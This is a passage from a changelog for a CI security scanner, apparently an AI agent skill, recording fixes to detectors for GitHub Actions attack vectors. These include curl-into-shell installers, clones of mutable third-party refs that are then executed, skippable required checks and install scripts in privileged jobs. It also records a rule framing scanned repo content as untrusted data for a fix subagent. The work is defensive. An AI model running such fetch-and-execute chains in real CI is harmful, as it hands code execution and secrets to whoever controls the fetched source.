    `tools/deps`", and `-r tools/requirements.txt` reported executing a file
    pip only reads. Options that take a separate value are skipped now;
    `pip install ./tools` and `-e ./tools` still report.
  - **A remote added by name is a remote.** `git remote add upstream <url>`
    followed by `git fetch upstream` is the same third-party fetch spelled in
    two steps, and two characters of indirection made the arm blind to it —
    while the catalog promised any `git`-spelled mutable fetch-and-run was
    visible.
  - **A pin has to come before the code runs.** Pinning is a claim about what
    executed, but any full-40-hex pin anywhere in the job suppressed the
    finding, so a `git checkout <sha>` written AFTER the execution hid a real
    chain. Pins now carry their position, and every suppression is recorded.
  - **A clone with no visible destination** is still not reported — the
    destination is unknowable — but it is now recorded, so a job that could not
    be read is distinguishable from a job with nothing in it.
  - **Shell that cannot be parsed** (an unbalanced quote) abandons the rest of
    that step and is recorded. It used to contribute nothing silently, and an
    unreadable `cd` left the working directory stale, so every path resolved
    after it in the step was wrong.

- **2026-08-14** — **`sec.required-checks.skippable` stops passing on partial
  evidence, and stops reding conditions that cannot be false.** Four cases
  where the outcome said more than the scan had established:

  - A **pass now requires every required check to have been traced.** It was
    returned as soon as ONE was gated, so the ordinary shape of a mature
    repository — a dozen required contexts, eleven of them external app checks
    — earned a machine `pass` that counted toward `passed` and never reached
    `unmeasured`, which meant no coverage caveat fired either.
  - A job with **`needs:` and no condition of its own is skippable**, not
    always-running: it is skipped whenever something it needs fails, which is
    exactly the state GitHub reports as a passed check. The producer has to
    carry the never-skip condition itself, which is what the fix recipe says.
    `needs:` written as a scalar string is read now too.
  - **Conditions that cannot be false are no longer reported as bypasses.**
    `if: true`, `if: ${{ always() }}` (the spelling GitHub's own documentation
    shows), `success()||failure()` written without spaces, and
    `success() || failure() || cancelled()` all failed — a false RED against
    repositories that had implemented the recommended fix correctly.
    `success()` counts as never-skipping only for a job with no `needs:`,
    since that is the only time it cannot be false.
  - A **demonstrated bypass now outranks an unreadable producer**: a real fail
    was being downgraded to "not judged" by a second producer whose skip walk
    had no answer.

- **2026-08-14** — **P14.24 no longer reports a repository for cloning
  ITSELF.** On a 2,920-workflow corpus this was 3 of the detector's 15 fires —
  all one repository's release workflows, cloning their own repo at the branch
  they release from. No third party is involved, and the advice the finding
  carries (pin to a full commit id) is unactionable for a workflow that must
  run at the branch head. The `git fetch` arm already refused the repo's own
  history; the `clone` arm now does too, recognising `${{ github.repository }}`,
  a literal `github.com/<owner>/<repo>` matching the checkout's `origin`
  remote, and the authenticated form that carries a token in the URL's
  userinfo. A tree with no `.git`
  cannot resolve `origin`, so the literal form reports there as before.

- **2026-08-14** — **P14.24 follows `working-directory:`.** It was read
  nowhere — not on the step, not in `defaults.run` — so a clone written under
  `working-directory: vendor` was placed at the workspace root, and a later
  `python3 tools/build.py` reading the repository's OWN file was reported as
  executing the fetched tree. That is a finding asserting a fact that is not in
  the data, which this scanner may never do. The mirror case, a
  `working-directory:` on the executing step, was a silent miss. Step, job and
  workflow levels now resolve in GitHub's order; a value computed at run time
  is recorded as a coverage gap instead of being guessed at.

- **2026-08-14** — **Branch protection read from only ONE of its two sources
  no longer renders as a complete, measured pass.** A repository can require
  checks through rulesets or through classic branch protection, so both are
  read and unioned — but the completeness guard sat inside the classic
  endpoint's `except`, leaving three ways for an unread source to render as a
  clean one: rulesets answering while classic failed for a non-403 reason (rate
  limit, timeout, 5xx) returned a PARTIAL set as complete; rulesets failing
  while classic answered lost the rulesets error entirely; and rulesets
  throwing while classic answered EMPTY returned "requires no status check",
  which scores as a pass — a claim about a source never read. All three
  rendered a green that counted toward `passed` and stayed out of
  `unmeasured`, so a consumer blended them as clean AND fully measured. The
  guard is now per-source and outside both calls; only the ordinary admin-only
  403, alongside a source that actually found something, still measures.

- **2026-08-14** — **A here-string no longer silences the rest of a step.**
  `<<<` carries its value on the line and opens no body, but the here-doc
  opener pattern retried at the second `<` and matched it — so everything after
  a `grep -q x <<< foo` was treated as here-doc body and never scanned, losing
  real findings with no trace. A here-doc named inside a quoted string
  (`echo "use << EOF for heredocs"`) did the same. The operator is now required
  to be shell syntax rather than text, using the quoting split this file
  already computes once, while the delimiter may still be quoted — `<<'EOF'`
  is the idiom. And when a here-doc really is open at the end of a step, that
  step is recorded in the scan's dropped-matches list, so a step that stopped
  being read is no longer indistinguishable from a step with nothing in it.

- **2026-08-14** — **A job in a workflow that cannot run on a pull request is
  no longer accepted as the thing gating one.** Producers are matched by
  display name across every workflow, with no check that the workflow runs on
  pull requests at all — so a `test` job in a tag-only release workflow (and
  the same shape under `workflow_dispatch:` / `workflow_call:`) was read as an
  always-running producer and vetoed the real, conditional one, turning a fail
  into a pass. Only `pull_request` / `pull_request_target` workflows, and
  `push` workflows not restricted to tags, can produce a pull request's checks.

- **2026-08-14** — **Path- and branch-filtered workflows are no longer reported
  as a bypass — that rule was backwards.** A workflow those filters skip never
  reports its check, so the required check stays PENDING and the pull request
  is BLOCKED; only a skipped JOB reports Success. Failing the filtered repo red
  a repository whose merges were already blocked, while the shape that really
  is green-without-running — GitHub's recommended always-succeeding stub job
  with the same name — passed. `pull_request.branches` also filters the base
  branch, the branch whose protection was just read, so every pull request this
  fact gates is inside that filter by construction. The clause is gone.

- **2026-08-14** — **A verdict job can no longer alibi the suite job it was
  added to cover for.** `name (value)` is a MATRIX expansion, but the fact
  offered that prefix match to every job — so an always-running job named
  `test` was read as a producer of the required context `test (self-hosted)`,
  and its always-runs answer covered for the suite job that really reports that
  context and really can skip. That is this repository's own CI shape, which
  means the bypass was hiding behind the fix for the bypass. The expansion
  match now applies only to a job that carries `strategy.matrix`, and only for
  the COMBINATIONS that matrix can actually run — joined in the order its axes
  are declared, with `exclude:` honoured. A job named `test` running over
  `3.11`/`3.12` is not a producer of `test (self-hosted)`, and neither is one
  over `os: [self-hosted, ubuntu]` crossed with a second axis: a flattened
  value set said yes to any tokens appearing anywhere, including a single
  value from a two-axis matrix, a reordered pair, and an excluded combination.
  A matrix this scan cannot enumerate (an expression, `fromJSON`, a nested
  shape, or an `include:` block, which can add combinations and rename axes)
  produces no match at all, which leaves the context disclosed as not judged
  rather than silently gated.

- **2026-08-14** — **A workflow the scan could not read no longer costs
  `sec.required-checks.skippable` its API round-trips.** An unscannable
  workflow forces the fact to unmeasured — rightly, since the file nobody could
  read may be the one holding an always-running producer — but the fact was
  computed first and the answer thrown away, spending two or three `gh api`
  calls to reach a verdict nothing would read.

- **2026-08-14** — **Branch protection that could not be read in full is no
  longer reported as "requires no status check".** The rulesets endpoint is
  readable with repo read access; classic branch protection is admin-only. For
  the reader this fact is written for — auditing a repository they do not
  administer — the ordinary result is an empty rulesets response plus a 403,
  and that pair was returning "no required checks", which the fact scored as a
  pass. A repository can require checks through either mechanism, so an empty
  answer from one and no answer from the other is unread, not unprotected: the
  fact is now unmeasured, with the admin-only endpoint named as the reason.

- **2026-08-14** — **Evidence that describes what was actually read.**
  `sec.fork-approval.effective` printed `first_time_contributors`' sentence for
  `all_external_contributors` too, understating the reader's own setting and
  stating something false about what GitHub gates; each tier now has its own
  sentence. `sec.required-checks.skippable` quoted Python's `True` back at a
  file that says `if: true`. Both facts' unmeasured evidence told the operator
  to "pass --repo owner/name" — a flag they never type, since the skill's own
  flow derives it — and named the wrong cause: the reachable remedy is
  `gh auth login`, and it now says so. The census document gains the fix recipe
  for each new fact (the verdict job; the repository Actions setting, which no
  YAML edit can close), a source note for the skipped-required-check behaviour
  the whole fact rests on, and the caveat that the score's denominator is
  token-dependent and therefore not comparable across differently
  authenticated scans. SKILL.md and `run.py` no longer describe `--repo` as
  being for the dormancy lookup alone, or a missing token as costing one check.

- **2026-08-14** — **The skill description is back under the 1024-character
  cap.** Naming both of P14.24's shapes in the vector enumeration pushed it to
  1037 — over the limit, so the loader truncates it, and what gets truncated is
  the tail: the "Do NOT trigger for …" clauses that keep ci-secure from
  answering ci-speedup's and ci-score's questions. Trimmed to 1019, and a
  repo-level guard (`tests/test_skill_description_budget.py`) now measures every
  shipped skill's description so the next enumeration cannot cross it silently.

- **2026-08-14** — **P14.24's catalog entry states the shapes it does NOT
  catch.** The entry promised its stopping points were "stated rather than
  implied" and then named two. The shell arm reads `git clone` / `git fetch`
  only, so `gh repo clone`, `svn`, `pip install git+…@branch`, a submodule
  `--remote` update, a fetched tarball, a rename between fetch and execution, a
  build driver rather than an interpreter, and a versioned interpreter are all
  the same trust model and all unreported. All now listed in the entry, so a
  clean P14.24 is not read as a guarantee. (Self-clones were also listed here
  at the time; they stopped being reported at all later the same day — see the
  self-clone entry above, which is the final behaviour.)
  The entry's TL;DR opening also names what is checked again, since the report's
  "what each vector checks" appendix quotes that first sentence verbatim.

- **2026-08-14** — **P14.24 no longer reads a step's working directory into the
  step after it, and no longer forgets it at a blank line.** Step boundaries
  were inferred from line adjacency, which is wrong in both directions: two
  one-line `- run:` steps are adjacent lines in different steps, so a `cd` into
  a freshly cloned directory leaked forward and the scan reported an execution
  that never happened in that tree; and a blank line inside a single `run: |`
  block broke adjacency mid-step, so a real fetch-then-execute chain was lost.
  Boundaries now come from where each `run:` scalar begins. Two more shell
  readings were wrong alongside it: a HEREDOC body (`cat <<'EOF' > install.sh`)
  was read as commands the step runs, so documentation could be reported as a
  live chain; and pairing compared line numbers only, so
  `python3 tools/setup.py && git clone … tools` reported a script that ran
  BEFORE the clone as having come out of it.

- **2026-08-14** — **P14.24 no longer misreads a clone URL written as a `${{ }}`
  expression.** The runner substitutes an expression before the shell sees it,
  so it is one word; the scanner split it on its spaces, every positional
  argument after it shifted, and the destination was read out of the
  expression's insides. That is worse than an unknowable destination: the
  detector correlated against a directory that does not exist, so the chain
  went unreported AND a correct 40-hex pin on the real directory would not have
  matched it either.

- **2026-08-14** — **P14.24's mutable-fetch arm no longer goes blind on a
  `git clone --recurse-submodules`.** That option takes its value attached
  (`=<pathspec>`) or not at all, but the clone parser treated it as taking a
  separate argument, so it swallowed the next token and shifted the URL, the
  destination and the ref by one. The detector then correlated against a
  directory that never existed and reported nothing — a clone at a mutable ref
  followed by executing a file out of it went unreported whenever that flag was
  present. Only options that genuinely take a separate value are consumed now.

- **2026-08-12** — **The `sec.checkout.credentials-scoped` fact no longer fails
  workflows triggered only by `fork`/`watch`.** Those events fire when someone
  forks or stars the repo; the workflow runs base code in the base context with
  no attacker text, ref, or artifact entering the job, so a persisted checkout
  token cannot be read by any attacker-influenced execution and
  `persist-credentials: false` is not a defense there. Failing such a workflow
  was a false positive on a config that is not actually exposed. The fact now
  excludes `fork`/`watch` from its own applicability; a workflow that also
  carries a real untrusted trigger (a PR head, comment/issue/discussion text, a
  `workflow_run` artifact, a dispatch payload) still fails. The trigger set the
  other checks use is unchanged.

### Added

- **2026-08-14** — **A scored config fact for required status checks a job can
  skip.** GitHub counts a SKIPPED required check as a pass, so a required check
  produced only by a job carrying an `if:` condition is not a gate: a pull
  request that does not satisfy the condition merges with the check green and
  the suite never run — a bypass this repository shipped and had to close. The
  new `sec.required-checks.skippable` fact reads the branch's required contexts
  over the API, maps each to the workflow jobs that could report it by display
  name (matrix expansions included), and fails when every producer of a
  required context can skip — through its own condition or through a `needs:`
  chain that skips. The pass shape, and the fix recipe, is the always-running
  verdict job that `needs:` the conditional suites and asserts their results;
  `always()` / `!cancelled()` conditions are recognised as never-skipping.
  Required contexts no workflow job produces (external app checks) are named in
  the evidence, never failed — the scan cannot read them. Evidence names the
  required context, the workflow and job, and the condition that skips it.

- **2026-08-14** — **A scored config fact for fork-PR approval that gates
  nobody real.** `sec.fork-approval.effective` reads the repository's fork-PR
  workflow approval policy and fails only its weakest setting — approval
  required just from accounts NEW TO GITHUB — because any outside account old
  enough clears it and starts CI unapproved. Requiring approval from first-time
  contributors to this repository (GitHub's default) is a legitimate trust
  judgment and passes, as does requiring it from every outside account. The
  fact is hygiene, not an exploit chain, and says so: fork runs still carry no
  secrets and a read-only token, so an unapproved run buys compute under the
  repository's name and quiet iteration against its CI surface, not a path to
  secrets. The policy enum is the one GitHub documents and a live repository
  returns; a value outside it is disclosed as unrecognised rather than judged.

- **2026-08-14** — **Both new facts are token-gated and never silently green.**
  They read the GitHub API rather than workflow YAML, so with no repository or
  no token they report as UNMEASURED with the reason stated — the same contract
  the impostor-SHA vector keeps. An unmeasured fact scores nothing and stays in
  the applicable count as a named coverage gap, so an offline scan reads as a
  smaller measurement rather than a cleaner repository. The scored basis grows
  from six facts to eight for a scan that can reach the API.

- **2026-08-14** — **P14.24 now catches remote code fetched with git, not just
  piped into a shell.** The vector was written around `curl … | bash`, so a
  workflow that cloned or fetched somebody else's repository at a BRANCH, TAG,
  `HEAD`, or a short commit id — and then ran a file out of the tree it
  landed in — passed the scan clean. It is the same trust model in different
  clothes: a branch or tag is designed to move, so whoever can push to that
  repository chooses what the next CI run executes, with nothing in your own
  repo changing. The entry keeps its id, its severity, and its place among the
  ten; its detector now has two arms, and the piped-installer arm is the code
  that was already shipping, unchanged. A fetch pinned to a full 40-character
  commit is immutable and is deliberately NOT a finding — that is the trust
  model this catalog recommends for action pins — while an abbreviated sha,
  which git re-resolves at fetch time, is. The pairing has to be visible
  inside one job (destination directory ↔ executed path, `cd` followed), so a
  clone whose destination the YAML does not show, and an execution in another
  job, are not reported rather than guessed at. Execution shapes covered:
  interpreters running a fetched file, `source`, `pip install <fetched-dir>`,
  and a fetched path invoked directly.

- **2026-08-10** — **A repo guard for installer-shaped literals.** Two shapes
  now fail the build if they appear in tracked text: a fetch of a literal
  http(s) URL that is then executed (piped into a shell, run via process
  substitution, or handed to `deno run`), and any literal http(s) URL whose
  path ends in `.sh` / `.ps1` / `.bash` — executed or not, because that link
  alone is what Snyk's E005 rule names. A fetch that only downloads is
  deliberately allowed, so a workflow example may still show a plain
  `curl -o`; prose that describes the class without an address is untouched.
  Line continuations are folded before matching, so wrapping a command across
  lines does not hide it. The guard also reads `.fixture` files for the first
  time — four of the eight literal sites it was written for lived there, where
  the previous suffix allowlist could not see them at all.

### Fixed

- **2026-08-10** — **The catalog's own `curl | bash` examples no longer read as
  a remote installer.** Two registry scanners failed the published skill over
  its teaching material: one rated it CRITICAL for "a direct link to an
  install.sh script" — the WRONG/RIGHT examples in the P14.24 pattern and the
  fixtures behind them — and the other recommended against installing the skill
  over a matching literal in a test assertion. Both strings already used
  RFC-reserved hosts, which is what the 2026-08-07 pass had moved them to; the
  rules key on the SHAPE of a fetch-and-run URL, so a reserved host does not
  clear them. The examples now fetch through an `<installer-url>` placeholder,
  matching the `<known-sha256>` placeholder already in the same fix recipe, so
  the recipe an agent applies still reads as "fill this in". It costs the
  reader nothing (the detector matches on the pipe into a shell, not on the
  address) and costs the detector nothing — the positive fixture still fires
  and the download-then-verify negative control still does not. The previous
  guard could not have caught any of it: it looked only for look-alike brand
  domains, so it watched this class regress without ever firing.
- **2026-08-09** — **Hostile workflow filenames neutralized in hygiene
  evidence.** A workflow filename carrying backticks reached a config-hygiene
  table cell raw (that path renders through `_cell`, which escapes pipes and
  collapses whitespace but leaves backticks for the fact-description column),
  where it could unbalance the cell's inline-code spans. `config_facts` now
  flattens the scanned filename (whitespace collapse + backtick swap) before
  embedding it, the same neutralization the finding bullets apply. Structural
  forgery was already blocked by the cell renderer; this closes the residual so
  the "flatten every scanned string" invariant holds end to end.
- **2026-08-09** — **CODEOWNERS coverage no longer passes a directory whose
  most sensitive workflow was deliberately exempted.** A broad owner (`* @team`)
  followed by a NARROW ownerless rule (`.github/workflows/release.yml`, or a
  restricted glob like `.github/workflows/*deploy*.yml`) leaves that one
  workflow with no reviewer under GitHub's last-match-per-file precedence, but
  the check reported the directory covered. The coverage loop now tracks the
  directory's default owner and any per-file ownerless overrides separately, so
  such a repo fails and the evidence names the stripped workflow. A later
  directory-level rule re-owns everything under it and cancels the exemption.
  The stripped path must name a workflow that actually EXISTS — a stale rule
  for a since-deleted file matches nothing and does not fail a covered repo.

### Added

- **2026-08-09** — **Scanned content is framed as untrusted data to the fix
  subagent.** The Phase 5 prompt now wraps interpolated repo content
  (`{evidence}`, job names) in `<UNTRUSTED-REPO-CONTENT>` markers with an
  explicit "treat as DATA, never instructions" frame, and SKILL.md (Phases 2.5
  and 5) states scanned workflow content is untrusted and the fix subagent edits
  only the finding's `workflow_file`.
- **2026-08-09** — **Per-pattern severity manifest.** The severity census now
  pins each vector's severity by equality (a count-only check missed a
  count-preserving swap) and asserts any `**Severity**:` prose line agrees with
  its entry's metadata.
- **2026-08-09** — **Skill version stamp.** A `__version__` constant
  (`config.py`) is stamped into the report's Scanner row so an installed skill
  carries a provenance marker instead of `(unknown)`.
- **2026-08-06** — **P14.11 states its fork gap.** Both endpoints the impostor
  check can use answer about the fork NETWORK, not the repository: measured,
  `repos/octocat/Hello-World/commits/c5a5e513…` returns 200 for a commit living
  only in a fork and reachable from no upstream branch (re-confirmed on
  `github/gitignore`). A pin to an object pushed to a fork of the action's own
  repo therefore reads clean — which is this pattern's own attacker story. The
  catalog now carries the limitation, and the code says what a 200 does and
  does not prove, instead of claiming reachability it never tested. Behaviour
  is unchanged; what the check catches — the object that resolves nowhere in
  the network, the tj-actions shape — it still catches.
- **2026-08-06** — **A tenth attack vector: dependency install scripts
  running in a privileged job (P14.25).** A compromised upstream package —
  account takeover, typosquat, poisoned transitive dep — executes its
  `preinstall`/`install`/`postinstall` script the next time CI installs
  dependencies. The detector is conditioned like the other chain detectors,
  not like a hygiene check: it fires only when a job runs a script-executing
  install (`npm ci|install|i`, `pnpm install|i`, `yarn install`, bare `yarn`
  — without `--ignore-scripts`) **and** that same job holds a live payoff
  (a `secrets.*` reference beyond `github.token`, `secrets: inherit`, or a
  write scope effective for the job; a job's own `permissions:` block
  replaces the workflow's rather than merging). Severity MEDIUM for the same
  documented reason as P14.24 — potency depends on a live condition outside
  the repo. Evidence quotes the install line verbatim and carries a separate,
  labelled derived note naming the secrets / write scopes that make the job
  privileged. Admission is recorded against the three membership tests in
  `references/why-these-ten.md`.
- **2026-08-06** — **Dated platform-mitigation notes on the vectors GitHub
  narrowed in mid-2026, rendered with the finding.** P14.7 (read-only cache
  tokens for untrusted triggers, June 26 2026 — still live on GitHub
  Enterprise Server and third-party cache backends; trusted-trigger cache
  poisoning survives the change too but is outside this detector, and the
  note says so rather than listing it as a residual of the finding), P14.9 (checkout refuses fork head/merge checkouts under
  `pull_request_target` / `workflow_run`, June 18 2026, backported July 20
  2026 — with GitHub's enumerated residuals and the adoption hole that a
  SHA- or patch-pinned checkout never receives the backport; "upgrade to v7
  and re-pin" added to the fix recipe), P14.18 (workflow-trigger policies
  shipped June 18 2026 but opt-in and evaluate-mode — nothing changes on
  default config), and P14.25 (npm v12 defaults). Each note carries its date
  and its residuals; no detector or severity changed. A `Platform
  mitigation` row now renders under the attacker line, so a github.com
  maintainer never reads an unconditioned claim.

- **2026-08-06** — **The close states the security score, with its
  denominator.** The report emits one greppable line —
  `Security score: 50.0/100 — 1 of 2 scored facts pass, of 3 applicable;
  unmeasured: sec.secrets.no-blanket-inherit` — and the close pastes it
  verbatim (`grep '^Security score:'`), exactly as it pastes the banner,
  so a user told "clean" also learns the grade and nobody re-words the
  number. **SUPERSEDED 2026-08-07** — that line is no longer rendered and
  the grep matches nothing; the close names failing hygiene checks in plain
  words instead. Kept as history; it is not current behavior.
- **2026-08-06** — **Catalog links point at the published catalog.** Every
  "See [catalog §P14.x]" now resolves to the public skills repo's main-branch
  URL — stable path, stable pattern-id anchors — and `--catalog-url`
  overrides it. `verify_report.py` fails any catalog link that is not on that
  path, and separately fails an `#anchor` that matches no heading in the
  shipped catalog (the other half of the 404). _History: these links were
  originally commit-pinned permalinks to the skill checkout's own HEAD — a
  sha the public repo never had, so every one 404'd — and were briefly
  changed to a relative path, which resolves nowhere because the report is
  not written beside the catalog. Commit-pinned permalinks stay banned._
- **2026-08-05** — **The report renders the security score it computes.** The
  security component of the CI Score was written only to the findings JSON, so
  a reader of the standalone report got a number they could not see over facts
  they could not check. A `Security score` section now follows the chain map:
  the score line (with the scored-vs-applicable split and any unmeasured facts
  named), one row per fact with its evidence, and the scoring rule.
  `verify_report.py` fails a report that drops a score the JSON carries. The
  JSON shape is unchanged. **SUPERSEDED 2026-08-07** — no aggregate is
  rendered anywhere a reader sees, and the verifier invariant is FLIPPED to
  prohibit one (see "No security score is rendered anywhere a reader sees"
  under Changed). Kept as history; it is not current behavior.
- **2026-08-06** — **The catalog-link check sees both ways it has broken.**
  It read only `https?://…`, so a return to the bare relative path — which
  resolves nowhere, the report not being written beside the catalog — passed
  silently. It now checks every markdown link destination, in any spelling,
  while leaving the data-sources table's backticked mention of the catalog
  path alone.
- **2026-08-05** — **A gated job's `if:` condition is quoted in the
  evidence.** A cache-writing job behind a trust check rendered as an
  unqualified fork-PR compromise. The gate is now shown — not treated as a
  fix, because gates get bypassed.
- **2026-08-06** — **The self-check has more teeth.** A report with findings
  and not one repo-grounded attacker scenario now fails (it used to fall back
  to counting the bare phrase anywhere on the page); every catalog `#anchor`
  is checked against a real heading in the shipped catalog, closing the half
  of the 404 the URL check cannot see; and a score block that carries no facts
  fails unless the report says so.


- **2026-08-03** — **ci-secure scores six security config facts and emits the
  security component of the CI Score** (`security_score` in the scan JSON; new
  `scripts/config_facts.py`, methodology in `references/security-facts.md`).
  The nine exploit chains stay findings-only and never enter this number —
  several chain detectors are lexical, and a public score must not grade a
  stranger's repo down on an unconfirmed match. What is scored are
  deterministic pass/fail facts: permissions declared per workflow;
  workflow-level writes scoped to jobs (**id-token excluded by construction**
  — ci-score's `scoped-id-token` owns that scope, and one YAML edit must never
  move both tools' numbers; a census test pins the full disjointness table
  against a frozen manifest of ci-score's registry); CODEOWNERS covering
  `.github/workflows/` (detector restored as a scored config fact); **a
  sharpened trigger fact** — a bare untrusted trigger passes (it is
  true of 84% of repos and discriminates nobody), the fact fails on trigger +
  attacker-head checkout, and only the full chain with execution remains the
  P14.9 finding, so fact and finding cannot fire on the same edit; no blanket
  `secrets: inherit`; and `persist-credentials: false` on untrusted-trigger
  checkouts. **Registered rule: 100 × passed / scored, no weights.** An
  unscannable workflow forces every workflow-scoped fact to UNMEASURED — no
  pass, no fail, the gap named, kept in the applicable count — because a
  universal claim cannot be asserted over files that could not be read; a repo
  where nothing measured yields `score: null` with a reason, never 100. The
  facts layer is isolated so its failure degrades to an honest unmeasured
  block rather than killing the scan, and that degraded block carries the
  **same key set as a real one** (a consumer reading `constants` must not
  KeyError on the one path where the block is supposed to be least
  surprising) — pinned by test. Data-only: report.py renders nothing
  from this block yet. Nine mutation red-proofs, including the disjointness
  exclusion and the silent-pass-over-a-coverage-hole case.

### Changed

- **2026-08-09** — **ci-secure claims its own topic words.** The frontmatter
  description now triggers on "is my CI secure" / "audit my CI security" and
  routes speed/cost asks to ci-speedup and grading asks to ci-score, instead of
  pointing topic-word asks at the not-yet-public ci-advisor door (to be restored
  when ci-advisor ships). `references/security-facts.md` reworded so its title
  and lede name the security facts as machine-only inputs for a future blend,
  not a user-facing score.
- **2026-08-09** — **First-run and contract fixes to SKILL.md.** The scan
  command uses the zsh-safe `${REPO:+--repo} ${REPO:+"$REPO"}` two-token idiom
  (the one-token form became a single argv under zsh and exited 2); the
  `<ci-secure>` placeholder is defined as the skill's own install directory; the
  Phase 4 close counts ACTIVE findings and uses the clean-run "Save / Don't
  save" options (no "None," prefix) when every finding is dormant; the P14.11
  summary line reads the banner + `gh_checks` rather than tokens the vector-map
  row does not carry; and the "Adding a pattern" recipe points at the real
  fixture path (`tests/fixtures/dot-github/…yml.fixture` + `cloak-manifest.json`),
  the `## METADATA schema` section, and the `**Anti-pattern**:` marker spelling.
- **2026-08-08** — **Documentation truth pass.** Shipped prose no longer makes
  claims the code does not support: the scanner cited a config fact id that
  does not exist (`sec.permissions.present`) instead of the two that do; the
  rejection record's arithmetic disagreed three ways ("~27 patterns" in prose,
  "removed 19" in a test, 15 actually named) and is now counted by a census
  test; "two of them are already pass/fail facts in the CI Score" was one
  (P14.8 ↔ `ci.security.scoped-id-token`); stale pointers to a
  `why-these-nine.md` and a `reports/` directory that do not ship are reworded;
  `run.py`'s exit-code table is complete (scan's authentication exit 2 and how
  it propagates); the P14.11 heading is spelled "Impostor", matching the rest
  of the skill, with the Chainguard research left at its own title's spelling.
  Internal development shorthand (gap ids, QA-batch and "ruling" wording,
  "registry v0.2") is out of shipped text. No behavior change.
- **2026-08-08** — **The CODEOWNERS hygiene check reads the file the way
  GitHub does, and says "unmeasured" when it cannot read it at all.** Four
  fixes to `sec.codeowners.workflows`. (1) The slashless directory forms
  `.github/workflows @team` and `.github @team` now cover — CODEOWNERS uses
  gitignore semantics, where a directory pattern without a trailing slash
  matches the directory and everything under it, so correctly-configured repos
  were graded down. (2) A bare `.github/` (or `.github`) at END of line matched
  no pattern, because every directory pattern required trailing whitespace — so
  the exact ownerless form fell through and an earlier `* @team` was taken as
  the last matching rule, grading the repo covered when GitHub assigns nobody.
  All patterns now end `(?:\s|$)`, which also tightens `.github/**` so a
  restricted glob under it (`.github/**/*release*.yml`) no longer reads as
  directory-wide coverage. (3) The file is read as `utf-8-sig` — a UTF-8 BOM
  used to sit in front of the first line and defeat the `^` anchor, inventing
  "no entry covering workflows" for a repo whose only rule was the covering
  one — and decoded STRICTLY, because `errors="replace"` laundered undecodable
  bytes into that same confident fail. (4) The check is now three-state: a file
  it cannot read or decode comes back **unmeasured** with the reason stated,
  instead of being scored as a fail. The unreadable-directory case is contained
  too — the `Path.is_file()` probe sat outside the `OSError` guard, so one
  EACCES escaped to the scanner's broad backstop and took all twelve facts down
  with it; it degrades to a single unmeasured row now.
- **2026-08-07** — **The `pull-requests: write` vector is described by what it
  detects.** The skill's own summary called it "write-token fork triggers",
  which is narrower than the detector (eleven untrusted trigger events, not
  just fork PRs) while the README called it "write tokens", which is broader
  (only `pull-requests: write` fires it). Both now say what the detector does.
- **2026-08-07** — **The "never opens a PR" rule says what it means.** The
  contract carried an unqualified NEVER alongside a phase that describes
  drafting a PR when the user asks for one. It is now scoped: never unasked;
  the default remains that the user reviews the working-tree diff.
- **2026-08-07** — **An install-surface guard covers ci-secure.** Maintainer-only
  files, `.ci-secure-*` runtime-capture directories, and any workflow-shaped
  fixture tracked at a real `.github/` path under the skill are now a PASS/FAIL
  invariant rather than a convention, matching the guards the sibling skills
  carry.
- **2026-08-07** — **No security score is rendered anywhere a reader sees.**
  The report used to print `Security score: N/100 — X of Y scored facts pass`,
  and the close pasted that line. Live runs read it as a contradiction:
  "5 of 6 facts pass" sat directly above ten green vector rows, and the two
  measure different things — the vectors are open doors, the facts are armor.
  A hygiene aggregate labelled "Security score" also overclaims what six
  configuration observations can say. The six facts now render as a
  `## 🧰 Config hygiene checks — pass/fail` table with a preamble stating that
  they are not attack vectors and are scored nowhere in this report, and the
  close names failing checks in plain words ("one hygiene gap: no reviewer
  rule covers your workflow files") or says all pass. **The findings JSON
  keeps its shape** — `security_score` has the same keys, `fact_id`s,
  outcomes and aggregate, so ci-advisor still blends from it; only prose the
  report prints changed (one `fact` sentence and the crash-path `reason`,
  which had to stop naming a score the report no longer renders), so bind to
  the ids, not the sentences. Quantification is deferred to ci-advisor, where
  the blend context carries the denominators. The verifier invariant is FLIPPED:
  it now prohibits any rendered aggregate and requires the pass/fail table.
  This reverses a rendering added on 2026-08-05; the reasoning for that change
  ("a score computed but not shown is a number the reader cannot check") is
  answered rather than overlooked — the number is not for the reader — and
  both the computation site and the verifier now say so, so the round trip is
  not run a third time.


- **2026-08-06** — **The countable unit is an attack VECTOR, and there are
  ten of them.** Every reader-facing count and label moved from "nine
  chains" to "ten vectors": the skill description, the banner
  (`▏N of 10 vectors hit▕`), the report's `🔗 Vector map — all ten` and
  `📖 What each vector checks` sections, the headline and its counting
  sentence, the methodology rows, the close receipt (numbered 1–10), and
  `references/why-these-nine.md` → `references/why-these-ten.md` (with
  `tests/test_census_why_these_nine.py` → `…_ten.py` and
  `verify_report.py`'s `THE_NINE` → `THE_TEN`). The scope-honesty line
  ("Critical exploit-chain checks only — this is not a comprehensive
  audit.") is unchanged, verbatim, as is the membership filter's
  "outsider → compromise chain" wording, which describes a sequence rather
  than the countable product noun. `#chain-*` anchors and internal function
  names were left alone — renaming them adds churn and link risk with no
  reader value.

- **2026-08-05** — **The close shows the chain-by-chain receipt, inside
  the question.** The close now delivers the banner plus a per-chain
  receipt line for each of the nine chains (⚠️ not-run rows included) —
  and because prose printed in the same turn as a structured question is
  preempted by the question UI and never seen, the receipt rides inside
  the close question's own text whenever a question immediately follows.
  Previously a clean run's close was one banner line plus the save offer,
  which told the user nothing about what had been checked (feedback from an
  early run; the prose-then-ask variant shipped first and was invisible in
  practice — found on a later run). Receipt lines are numbered 1–9 and plain
  text — no bold/headings/fences in the question text; a fully-bold close
  was feedback from a later run. Receipt lines carry the catalog
  id, and severity squares are enforced: a hit chain renders 🟥 (HIGH) or
  🟧 (MEDIUM) with its site count, ✅ only for evaluated-clean, ⚠️ for
  did-not-run.
- **2026-08-05** — **Findings selection maps by eye and never offers a
  door to nowhere.** Fix options carry their chain id (e.g. `P14.10`) and
  receipt hit rows are tagged `→ Finding N`, bridging the receipt's 1–9
  chain numbering and the options' finding numbering. The third option is
  sized to what remains: "A different selection" only with three or more
  groups, "Fix both" with exactly two, omitted with one (in an early run,
  "a different selection" was offered when the two named options already
  covered everything).
- **2026-08-05** — **"None," is legal only beside fix options.** The
  all-findings-fixed close re-shipped the "None, just save the report"
  label with nothing offered beside it (seen in an early fix run);
  a standalone save offer — zero found or all fixed — now always uses
  "Save the report (.md)" / "Don't save".
- **2026-08-05** — **A later fix never silently joins an earlier fix's
  PR.** User authorization to commit/push is per-scope: when a branch or
  PR from a prior fix exists, the skill asks "add to PR #N or open a
  separate branch/PR?" before pushing (an early fix run bundled
